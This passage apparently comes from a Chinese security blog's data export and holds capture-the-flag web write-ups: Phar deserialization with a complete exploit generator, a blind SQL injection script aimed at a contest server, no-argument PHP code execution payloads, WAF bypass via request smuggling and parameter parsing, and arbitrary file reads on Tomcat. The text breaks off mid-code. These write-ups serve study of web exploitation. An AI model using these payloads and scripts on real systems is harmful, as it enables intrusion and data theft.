header的最后一个参数的值。 get_defined_vars() 测试发现其可以回显全局变量 $_GET $_POST $_FILES $_COOKIE 可以利用$_GET进行RCE，例如 ?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo(); current() 函数返回数组中的当前元素的值。end() 函数返回数组中的最后一个元素的值。 session_id()可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路:hex2bin 脚本： import requests url = &#39;http://127.0.0.1/a.php?code=eval(hex2bin(session_id(session_start())));&#39; def str_to_hex(s): return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s]) payload = str_to_hex(&quot;phpinfo();&quot;) print payload cookies = { &#39;PHPSESSID&#39;:payload } r = requests.get(url=url,cookies=cookies) print r.content getenv()$_ENV，对应函数为getenv()如何从一个偌大的数组中取出我们指定的值呢？ 我们医药用到两个函数：array_rand()和array_flip()： array_rand()获取数组中随机的一个键array_flip() 交换数组中的键和值 我们可以通过爆破来获取我们想要的值，来进行RCE。 直接读文件getcwd()获取当前目录chdir() 切换目录dirname() 返回路径中的目录部分scandir() — 列出指定路径中的文件和目录next() 返回数组中的下个单元prev() 返回数组的上一个单元pos()和current() 返回数组中的当前单元end() 返回数组中的最后单元each() 返回数组中当前的键／值对并将数组指针向前移动一步reset() 将数组的内部指针指向第一个单元 遍历当前目录：var_dump(scandir(getcwd())); 遍历上一级目录：var_dump(scandir(dirname(getcwd())));切换到当前目录所在的目录:chdir(dirname(getcwd()));获取上级目录的所有文件：scandir(dirname(chdir(dirname(getcwd())))) 其中返回值为一维数组前两个值为’.’和’..’从数组中获取自己想要的文件名这个上面有说明。 读文件用 readfile()函数即可。 payload: ?code=readfile(pos(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Phar反序列化","slug":"Phar反序列化","date":"2019-11-06T12:10:37.000Z","updated":"2020-04-22T09:37:02.006Z","comments":true,"path":"2019/11/06/Phar反序列化/","link":"","permalink":"http://yoursite.com/2019/11/06/Phar反序列化/","excerpt":"前言通过做题发现了Phar反序列化这个漏洞点，发现自己以前遇到过，但是都是模模糊糊的过去了。这次就好好总结一下。","text":"前言通过做题发现了Phar反序列化这个漏洞点，发现自己以前遇到过，但是都是模模糊糊的过去了。这次就好好总结一下。 Phar 反序列化Phar文件结构在php&gt;=5.3的时候，默认开启支持Phar，文件状态问为只读，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。 在php&lt;5.3得时候，要将php.ini中的 phar.readonly设置为off，否则无法生成phar文件。 其文件结构包括4个部分： stub phar 扩展识别的标志 格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; stub必须以HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。 manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化 contents 被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化 signature 文件的签名格式 Phar的使用方法 前提条件 有上传点 可以上传phar文件 有操作文件的函数，且函数的参数可控。 有魔术方法可以利用 举个栗子： &lt;?php class User{ var $name; function __destruct(){ echo &quot;Phar is nice!!!&quot;; } } @unlink(&quot;test.phar&quot;); $phar = new Phar(&quot;test.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); /* 如果有文件限制，可以增加gif文件头 $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); */ $o = new User(); $o-&gt;name = &quot;chuddy&quot;; $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;chuddy.txt&quot;,&quot;chuddy&quot;); $phar-&gt;stopBuffering(); ?&gt; 那反序列化部分的内容如何反序列化呢？在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化小trick：系统文件操作的函数一般都能使用伪协议流，Phar:// 也是ok的 测试一下： &lt;?php class User{ var $name; function __destruct(){ echo &quot;Phar is nice!!!&quot;; } } @file_get_contents($_GET[&#39;phar&#39;]); 可以发现可以执行反序列化。 函数扩展受影响的函数还有以下函数皆受影响 列表 file_get_contents file_put_contents() file() file_exists() is_file() unlink() fopen() read_file() is_dir() is_link() parse_ini_file() copy() stat() fileatime() filectime() filegroup() fileinode() filemtime() fileowner() fileperms() is_executable() is_readable() is_writable() is_writeable() 利用[CISCN2019 华北赛区 Day1 Web1]Dropbox打开页面发现是一个登陆框，通关尝试，没有发现注入点，于是就常规的注册登陆。发现是一个文件管理页面。 上传的文件有下载和删除的功能。尝试下载功能。发现可以任意文件下载通过控制filename这个参数可以实现任意文件读取。，于是我们可以把想过的文件都下载下来。其中有index.php,class.php,download.php, delete.php等。class.php &lt;?php error_reporting(0); $dbaddr = &quot;127.0.0.1&quot;; $dbuser = &quot;root&quot;; $dbpass = &quot;root&quot;; $dbname = &quot;dropbox&quot;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); //链接数据库 class User { public $db; public function __construct() { //初始化$db global $db; $this-&gt;db = $db; } public function user_exist($username) { //判断用户是否存在 利用了预编译的方法，所有没有找到注入点 $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { //注册用户 if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { //用户登陆的判断 if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); //调用其他类的close方法 } } class FileList { //这是文件的显示类 private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) { $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;; } $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;; $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= &#39;&lt;tr&gt;&#39;; foreach ($result as $func =&gt; $value) { $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;; } $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#39;; $table .= &#39;&lt;/tr&gt;&#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { //判断文件是否存在 return true; } else { return false; } } public function name() { return basename($this-&gt;filename); //返回路径中的文件名部分。 /home/admin.php 返回admin.php } public function size() { //判断文件大小 $size = filesize($this-&gt;filename); $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { //删除文件 unlink($this-&gt;filename); } public function close() { //返回文件 return file_get_contents($this-&gt;filename); } } ?&gt; 通过对class.php文件的审计，发现这里使用了预编译的方法，，所以登陆处没有sql漏洞。但是注意到 File类中的close方法，这个方法被调用可以获得文件的内容，如果能够触发这个方法，就有机会得到flag。 发现download.php里面调用了这个方法。 由于这里传递的filename过滤了flag这个关键字符串，所以不能通过文件下载来直接下载文件。download.php $file = new File(); $filename = (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) { //文件名不能有flag Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close(); //这里调用了close函数 可以打印文件内容 } else { echo &quot;File not exist&quot;; } 但是其他的文件都能够读取。 由于file类中的close方法，利用的是file_get_contents这个函数，也是受Phar反序列化影响的，如果能触发该方法，就有可能获取flag。 User类中存在调用close方法，但是该方法在对象销毁时执行 Filelist类中，存在call魔术方法，但是类没有close方法。 public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } php的call魔术方法,`call($func,$args)`会在对象调用的方法不存在时，自动执行。这里的call方法的作用就是，当调用的对象没有这个方法，首先把要调用的方法，压进$this-&gt;funcs中，然后遍历每一个文件，让每一个文件，都去调用刚才的方法。 如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。 这是一个大佬画的图，会更好理解： 可以利用Phar反序列化来弄exp: &lt;?php class User { public $db; } class File { public $filename; } class FileList { private $files; private $results; private $funcs; public function __construct() { $file = new File(); $file-&gt;filename = &#39;/flag.txt&#39;; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); } } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new User(); $o-&gt;db = new FileList(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 把文件改名为phar.png,然后上传，在delete删除该文件，抓包改数据，就可以得到flag","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"上海市大学生网络安全大赛部分web题解","slug":"上海市大学生网络安全大赛部分web题解","date":"2019-11-02T16:13:01.000Z","updated":"2020-03-01T11:37:36.621Z","comments":true,"path":"2019/11/03/上海市大学生网络安全大赛部分web题解/","link":"","permalink":"http://yoursite.com/2019/11/03/上海市大学生网络安全大赛部分web题解/","excerpt":"前言这周六有这个比赛，学到了一个骚姿势，在这里记录一下。","text":"前言这周六有这个比赛，学到了一个骚姿势，在这里记录一下。 easysql题目是easysql，看到这个题目感觉问题不是这简单。 打开题目发现是一个未完成的页面，发现可能存在sql注入。 通过简单的尝试我测试出一种绕过的方式： http://47.105.183.208:29898/article.php?id=123%27||(1)%23%2523) 继续通过测试发现过滤了一些关键字符串,,or,union select等字符串，让人很头大，虽然能够构造出得到库名的方法http://47.105.183.208:29898/article.php?id=123%27||(database()&lt;&#39;c&#39;)%23但是因为过滤了or这个关键的字符串，没有办法通过mysql的information的表来获取其他表的名字，但是查到了这个版本信息为： 5.6.46 当Mysql&gt;5.6.x时 在Mysql中，存储数据的默认引擎分为两类。一类是在5.5.x之前的MyISAM数据存储引擎，另一类是5.5.x版本后的innodb引擎。并且mysql开发团队在5.5.x版本后将innodb作为数据库的默认引擎。 而在mysql 5.6.x版本起，innodb增添了两个新表，一个是innodb_index_stats,另一个是innodb_table_stats。查阅官方文档，其对这两个新表的解释如下图： 从官方文档我们可以发现两个有用的信息： 从5.6.x版本开始，innodb_index_stats和innodb_table_stats数据表时自动设置的。 两个表都会存储数据库和对应的数据表。 唯一遗憾的是没有字段名 这个两个表存储了相应的数据表名等信息，我们可以通过这个表来弥补information表的缺陷。因此我们可以构造http://47.105.183.208:29898/article.php?id=123%27||((select group_concat(distinct table_name) from mysql.innodb_index_stats)&lt;&#39;0&#39;)%23来进行盲注可以得到相应的数据表：article,fl111aa44a99g 由于我们无法知道这里的列明，所以可以选择无列名注入： http://47.105.183.208:29898/article.php?id=123%27||(substr((select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `c`)n where 0 union/**/select * from fl111aa44a99g)x) from 1)&lt;&#39;0&#39;)%23 可以注出flag。 注入脚本为： import requests url = &quot;http://47.105.183.208:29898/article.php?id=123%27||&quot; sql_str =&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-}{~!@$%^&amp;*()_&quot; flag = &quot;&quot; for i in range(1,40): for j in range(1,len(sql_str)): # payload =&quot;(database()&lt;&#39;&quot;+flag+sql_str[j-1:j]+&quot;&#39;)%23&quot; # database cccttffff # payload =&quot;(version()&lt;&#39;&quot;+flag+sql_str[j-1:j]+&quot;&#39;)%23&quot; # version 5.6.46 # payload =&quot;(substr((select group_concat(distinct table_name) from mysql.innodb_index_stats) from &quot;+str(i)+&quot;)&lt;&#39;&quot;+str(sql_str[j-1:j])+&quot;&#39;)%23&quot; # article,fl111aa44a99g payload =&quot;(substr((select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `c`)n where 0 union/**/select * from fl111aa44a99g)x) from &quot;+str(i)+&quot;)&lt;&#39;&quot;+sql_str[j-1:j]+&quot;&#39;)%23&quot; # article,flaaag res = requests.get(url=url+payload) print url+payload # print res.text # exit() if &#39;2333333333333&#39; in res.text: flag += str(sql_str[j-2:j-1]) print flag break 学到的骚姿势这里学会了利用innodb_table_stats来注入表名。当过滤了or时可以利用这个表注出表名，再配合无列名注入，注出数据。 decade打开链接通过源代码，发现了/code这个地址 并且知道flag在当前目录下测试知道为index.php 访问/code得到： &lt;?php highlight_file(__FILE__); $code = $_GET[&#39;code&#39;]; if (!empty($code)) { if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code)) { if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } else { echo &quot;No way!!!&quot;; } }else { echo &quot;No way!!!&quot;; } No way!!! 发现这道题和byteCTF中的一道题目特别相似，是无参数rce,参考了大佬的做法。 第一个正则if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code));意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）。就是所谓的无参数RCE。 第二个正则则是过滤了一些字符，限制了我们的代码执行。 我们则需要通过eval($code);来读取flag内容，flag在index.php里面，而code.php则在/code/code.php里面，因此我们需要跨目录到上级目录。 第一步： 发现读文件的函数，我们发现file_get_contents、readfile等常规的读文件的函数都被ban了，通过尝试我发现了一个file()函数。 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行。既然是一个数组，我们可以用serialize序列化函数来转成一个字符串。就可以得到这个文件的所有内容了。 那就可以echo(serizalize(file()))读取文件内容了，就差构造文件名。 第二步： 最重要获取文件的目录了,参考大佬的payload:crypt(serialize(array()))首先定义一个数组，然后对其进行序列化的操作，输出为一个字符串，这是常规操作。然后就用到了一个非常关键的函数crypt() 说起来很复杂 , 仅需要知道它可以返回一个加密字符串。多次尝试之后发现，利用crypt返回一个加密的字符串，加密的字符串末尾有几率出现一个.。基本上是以. / 0 1这些为结尾。以$开头。 因为加密字符串的 “ . “ 可能会出现在末尾 . 这里很容易想到 用strrev()函数来反转字符串，然后利用chr(ord()) 这个组合，将.给取出来 ord() : 解析 string 二进制值第一个字节为 0 到 255 范围的无符号整型类型( 不严禁的说就是将字符串第一个字符转换为 ASCII 编码 ) chr() : 返回相对应于 ASCII 所0指定的单个字符 , 该函数与 ord() 是对应的~ strrev() : 反转字符串 可以利用chr(ord(strrev(crypt(serialize(array())))))得到. 由于scandir(getcwd())中的getcwd()这个函数被过滤了，我们可以用scandir(&#39;.&#39;)来代替 有了 “ . “ , 就可以利用 scandir() 和 next() 获得 “ .. “ 了 再利用chdir()函数修改当前目录。 chdir() : 将 PHP 的当前目录改为指定目录 . 然后再重复上面的操作：var_dump(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))); 原理就是先切换到flag所在的目录，然后再通过crypt()函数来对字符串加密得到.然后利用scandir可以得到flag所在的目录的文件名。 猜测文件应该再最后一个利用end来获取文件名，再利用file()来读文件，由于var_dump()被过滤了，采用serialize利用echo输出文件 payload: /code.php?code=echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))))))))))); 学到获取.骚姿势Math函数大佬的payload:ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))) 核心思路是 : phpversion() 函数会返回当前PHP的版本号 , 然后可以用 floor() 函数取第一位的数值，只会是5或者7。 有了数字 , 就可以通过各种数学运算拿到数字46 , 也就是ASCII字符 “ . “ .(膜一波师傅们tql)。 我试了一下，发现无论是5.x.x还是7.x.x都可以通过这和获取46这个数字。 利用到的函数： floor() : 返回不大于 x 的下一个整数 , 简单的说就是向下取整 sqrt() : 返回一个数字的平方根 tan() : 返回一个数字的正切 cosh() : 返回一个数字的双曲余弦 sinh() : 返回一个数字的双曲正弦 ceil() : 返回不小于一个数字的下一个整数 , 也就是向上取整 通过 chr() 函数就可以返回 ASCII 编码为 46 的字符 , 也就为 “ . “ , 后面的步骤就和之前一样 ,跳转到根目录chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))) 然后读取 index.php 文件。这里需要使用if函数来确保 测试代码： &lt;?php if(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))var_dump(file(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))); 我们可以看到这个字符串很长,如果我们不想利用if函数，我们可以利用time()+localtime()函数来实现操作。 time() : 返回自从 Unix 纪元( 格林威治时间 1970 年 1 月 1 日 00:00:00 )到当前时间的秒数 , 也就是返回一个时间戳 localtime() : 以数值数组和关联数组的形式输出本地时间 . 其中localtime关联数组的键名如下： [tm_sec] - 秒数 [tm_min] - 分钟数 [tm_hour] - 小时 [tm_mday] - 月份中的第几天 [tm_mon] - 年份中的第几个月，从 0 开始表示一月份 [tm_year] - 年份，从 1900 开始 [tm_wday] - 星期中的第几天 (Sunday=0) [tm_yday] - 年中的第几天 [tm_isdst] - 夏令时当前是否生效 localtime() 数组，可以提取出秒数的值，用chr转换为字符串 在第46秒时提取，可以获得&quot;.&quot; localtime() 的第一个参数默认为时间戳 , 也就是 time()的返回值 . time() 的参数为 void 也就是说引入任意的参数都不会影响 , 其输出为当前的时间戳 payload:var_dump(file(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))))); 可以写一个脚本一直跑，在每一分钟的46秒都可以读取到flag localeconv() 函数核心思路：localeconv() 函数 localeconv() : 返回一个包含本地化数字和货币格式设置信息的关联数组 . ➜ code php -r &quot;var_dump(localeconv());&quot; array(18) { [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot; [&quot;currency_symbol&quot;]=&gt; string(0) &quot;&quot; [&quot;mon_decimal_point&quot;]=&gt; string(0) &quot;&quot; [&quot;mon_thousands_sep&quot;]=&gt; string(0) &quot;&quot; [&quot;positive_sign&quot;]=&gt; string(0) &quot;&quot; [&quot;negative_sign&quot;]=&gt; string(0) &quot;&quot; [&quot;int_frac_digits&quot;]=&gt; int(127) [&quot;frac_digits&quot;]=&gt; int(127) [&quot;p_cs_precedes&quot;]=&gt; int(127) [&quot;p_sep_by_space&quot;]=&gt; int(127) [&quot;n_cs_precedes&quot;]=&gt; int(127) [&quot;n_sep_by_space&quot;]=&gt; int(127) [&quot;p_sign_posn&quot;]=&gt; int(127) [&quot;n_sign_posn&quot;]=&gt; int(127) [&quot;grouping&quot;]=&gt; array(0) { } [&quot;mon_grouping&quot;]=&gt; array(0) { } } 可以看到这个数组的第一位就是.然后可以利用函数将.取出来 current函数和pos函数都可以完成操作 ➜ code php -r &quot;var_dump(current(localeconv()));&quot; string(1) &quot;.&quot; ➜ code php -r &quot;var_dump(pos(localeconv()));&quot; string(1) &quot;.&quot; ➜ code 然后的操作就和第一种方法一样了。可以使用if函数，或者利用time()+localtime()函数来实现操作。 crypt()函数首先定义一个数组 , 然后对其进行序列化操作 , 输出序列化字符串 , 这里没什么问题 . 然后就用到一个非常关键的函数 : crypt()这个函数会返回一个加密的字符串。 这些字符串常以/ . 0 1结尾，配合chr(ord(strrev()))可以得到.。然后就时跳目录，读取flagpayload:echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))));","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"RoarCTFweb题解","slug":"RoarCTFweb题解","date":"2019-10-16T06:23:51.000Z","updated":"2020-03-01T11:37:32.447Z","comments":true,"path":"2019/10/16/RoarCTFweb题解/","link":"","permalink":"http://yoursite.com/2019/10/16/RoarCTFweb题解/","excerpt":"前言参加了RoarCTF,题目质量挺好的，学到了一些东西。在这里复现记录一下。","text":"前言参加了RoarCTF,题目质量挺好的，学到了一些东西。在这里复现记录一下。 easy_calc打开题目发现是一个计算器的功能，感觉计算器已经出过好多次了。查看源代码，发现了calc.php &lt;?php error_reporting(0); if(!isset($_GET[&#39;num&#39;])){ show_source(__FILE__); }else{ $str = $_GET[&#39;num&#39;]; $blacklist = [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\\[&#39;, &#39;\\]&#39;,&#39;\\$&#39;,&#39;\\\\&#39;,&#39;\\^&#39;]; foreach ($blacklist as $blackitem) { if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) { die(&quot;what are you want to do?&quot;); } } eval(&#39;echo &#39;.$str.&#39;;&#39;); } ?&gt; 这里过滤了好多的东西，和国赛的一道题很像，但是直接输入num=phpinfo()不能够解析，通过上面的代发也没有对其进行拦截，猜测应该是存在waf对其进行拦截。 过waf的两种方法：方法一：利用http走私：原理可以看 参考文章 这篇文章。 构造的请求头信息： POST /calc.php?num=phpinfo(); HTTP/1.1 Host: node3.buuoj.cn:28057 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 5 Content-Length: 5//利用http走私 num=1 能够执行phpinfo()的命令。 我的理解php中$_request 相同字段名优先接收post参数，就是这个同时向服务器传递get和post请求，而waf那里只处理了post请求的值，从而使get请求的值绕过了waf的拦截。 方法二： 利用php的一个字符串解析特性绕过bypass。[文章swww.freebuf.com/articles/web/213359.html) 一些php的特性的分析： 输入 输出 %20news_id news_id news%20id news_id news%00id news news[id news_id news.id news_id news+id news_id news_id%20 news_id_ 我么可以想到在num前面加%20来进行绕过 绕过waf之后，我们发现 禁用了一些危险函数，这里得到flag的方法也有几种： 方法一： 利用一些php的文件操作函数： getcwd — 取得当前工作目录 dirname(string $path) — 返回 path 的父目录 scandir — 列出指定路径中的文件和目录 payload: ? num=var_dump(scandir(dirname(dirname(dirname(getcwd()))))); 在根目录发现flag的位置/f1agg由于 $blacklist = [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\\[&#39;, &#39;\\]&#39;,&#39;\\$&#39;,&#39;\\\\&#39;,&#39;\\^&#39;]; 过滤了/,&#39;等字符不能够直接var_dump(file_get_contents(&#39;/f1agg&#39;))所以想到了利用编码来绕过。var_dump(file_get_contents(chr()chr(102).chr(4).chr(7)chr(103).chr(103)))可以得到flag. 方法二： 这个计算器特写向国赛初赛的一道题，这个可以采用国赛拿到题目的做法来做题。 base_convert函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回_ *等特殊字符 D:\\phpStudy\\php\\php-5.5.38 λ php -r &quot;echo base_convert(&#39;system&#39;,36,10)&quot;; 51504350 D:\\phpStudy\\php\\php-5.5.38 λ php -r &quot;echo base_convert(&#39;ls&#39;,3,10)&quot;; 784 D:\\phpStudy\\php\\php-5.5 ? num=base_convert(1751504350,10,36)(base_convert(784,10,36))可以成功执行phpinfo(); 我们发现dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin，来获取任意ASCII字符 D:\\phpStudy\\php\\php-.5.38 λ php -r &quot;echo base_convert(&#39;scandir&#39;,36,0)&quot;; 669338629 D:\\phpStudy\\php\\php-5.5.38 λ php -r &quot;echo hex2bin(dechex(&#39;47&#39;))&quot;; D:\\phpStudy\\php\\php-5.5.38 λ php -r &quot;echo hex2bin(dechex(&#39;46&#39;[题目链接](http://47.99.176.38:5111/))&quot;; . D:\\phpStudy\\php\\php-5.5.38 λ php -r &quot;echo hex2bin(dechex(&#39;32&#39;))&quot;; 这是空格 可以构造var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))相当于car_dump(scandir(./)) 可以一级一级的查看目录，最终在根目录找到了flag的位置。var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))文件名为f1agg,可以构造出readfile(/f1agg)来读取文件构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))就可以得到flag文件。 easy_java打开页面是一个登陆框 下面有一个help的链接，点进去发现没有东西，不能够下载文件，后来发现更改请求方式为post就可以下载文件了。 因为文件名是可控的所以我感觉可以实现任意文件下载。 对于登陆框尝试几次无果之后，选择了暴力破解，得到密码admin888 但是登陆进去发现啥也没有，但是在help页面可以读取任意文件： 在做测试时，发现了一些敏感信息的泄露： 我们可以得到这个的绝对路径，以及一些应用的版本Apache Tomcat/8.5.24 WEB-INF/web.xml泄露 WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 得到了一个和flag有关的类文件。根据其文件的分类规则我们推出其文件的位置WEB-INF/classes/com/wm/ctf/FlagController.class 得到了一串可以的字符串，base64解码之后就是flag。 simple_upload是一道代码审计题目，很清晰的看出是一个ThinkPHP的站 &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES[&#39;file&#39;] ; if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型 $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录 $upload-&gt;savePath = &#39;&#39;;// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) {// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; }else{// 上传成功 获取上传文件信息 $url = 